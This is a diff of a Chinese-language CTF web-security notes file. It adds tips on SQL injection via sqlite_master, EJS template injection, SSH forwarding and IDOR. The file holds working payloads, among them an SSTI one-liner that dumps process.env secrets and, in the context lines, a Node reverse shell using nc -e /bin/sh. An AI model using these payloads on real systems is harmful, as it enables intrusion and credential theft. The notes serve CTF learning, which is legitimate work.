@@ -205,11 +205,11 @@ for i in files:
 26. 当题目有提到“检查ip”，“只有我自己……”等有关获取ip的内容时，可以考虑是否在xff上做了手脚，比如我们能把xff改为127.0.0.1来伪造本机，甚至是执行模板注入。例题:[[MRCTF2020]PYWebsite](https://buuoj.cn/challenges#[MRCTF2020]PYWebsite)
 27. flag可能会出现在phpinfo界面的Environment里，有时候是因为出题人配置错误，有时候就是这么设计的。例题：[[NPUCTF2020]ReadlezPHP](https://buuoj.cn/challenges#[NPUCTF2020]ReadlezPHP)
 28. sql注入。
-
 - 在information_schem被ban后的替代注入+[无列名注入](https://blog.csdn.net/qq_45521281/article/details/106647880)。例题：[[SWPU2019]Web1](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5BSWPU2019%5DWeb1.md)
 - updatexml报错注入。例题:[HardSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/HardSQL.md)
 - 堆叠注入+符号`||`的利用。例题:[EasySQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/EasySQL.md)
 - 联合查询（union select）会构造虚拟数据，利用此虚拟数据可以伪造登录。例题：[BabySQli](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/BabySQli.md)
+    - 当过滤太多，无法获取数据库中账号信息但需要登录时使用。或者当数据库里压根就没有信息但仍需要登录时使用。如果是后者，也可以去sqlite_master里随便查出信息来用:`union select rootpage, type, name from sqlite_master --`，因为sqlite_master里一定是有值的
 - 二分法异或盲注。例题:[[极客大挑战 2019]FinalSQL](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/BUUCTF/Web/%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL.md)
   - 在这道题的基础上改动，使其成为通用的mysql布尔盲注脚本。当然改一下if语句的内容也能做延时注入（时间盲注）脚本。
 ```python
@@ -2266,7 +2266,7 @@ results = db.flags.find(
 238. [mongodb](https://xhacka.github.io/posts/mogodb/)
 - mongodb/[no sql injection](https://nullsweep.com/a-nosql-injection-primer-with-mongo/)的绕过登录payload。例：
     ```py
-    #https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code/83234#83234
+    #https://security.stackexchange.com/questions/83231/mongodb-nosql-injection-in-python-code/83234
     user = db.users.find_one(
         {
         "$where":
@@ -2717,3 +2717,14 @@ SuperSerial不处理函数，所以没法像python的pickle那样直接RCE。
 - 反弹shell payload:`((require("child_process")).execSync("nc ip port -e /bin/sh"))`
 - alpine container包含的功能很少，比如没有bash
 277. [Node Serialize](https://github.com/luin/serialize/tree/master) rce：https://blog.websecurify.com/2017/02/hacking-node-serialize （从Exploit Setup开始是漏洞详细信息）
+278. [Payback](https://discord.com/channels/818117978536017952/1132660345824083978)(wp在discord里，该服务器的邀请链接：https://discord.com/invite/MXdFD6WeTR )
+- 若burpsuite访问网站时提示unknown host但普通浏览器可以正常访问，尝试将host写入本地`/etc/hosts`文件
+- `.dbshell`：MongoDB client uses it as history file for the MongoDB CLI client
+- `/etc/nginx/sites-enabled`为nginx config file所在的文件夹
+- 若可以用ssh访问远程机器的一个内网网站，则能利用ssh将其转发。`ssh -L <remote_port>:<local_host>:<local_port>`,如`ssh -L 3000:127.0.0.1:3000`,将远程的3000端口映射到本机的3000端口。 https://www.cnblogs.com/dwtfukgv/articles/12837356.html
+- EJS template engine ssti。可用`<%= 2*2 %>`测试，回显4则有ssti
+    - 此时可以尝试RCE payload了，不过要是禁止了require的话会比较困难
+    - 还能考虑`.env`文件。 The file .env is popular with NodeJS applications, and it's commonly used to store secrets like database credentials and API keys. This file is typically imported using the dotenv module, which parses and store it into the process.env object. 可用`<%= JSON.stringify(process.env) %>`读取
+- `mongodb://`开头的url可在命令行用`mongodb mongodb://xxx`访问
+279. [idoriot](https://github.com/Crypto-Cat/CTF/blob/main/ctf_events/imaginary_23/web/idoriot.md)
+- [IDOR](https://portswigger.net/web-security/access-control/idor)漏洞：指攻击者可控制程序用于设定权限的参数。比如`http://xxx.com/?user_id=1`中的user_id用于控制权限，但用户可随意设置，导致提权
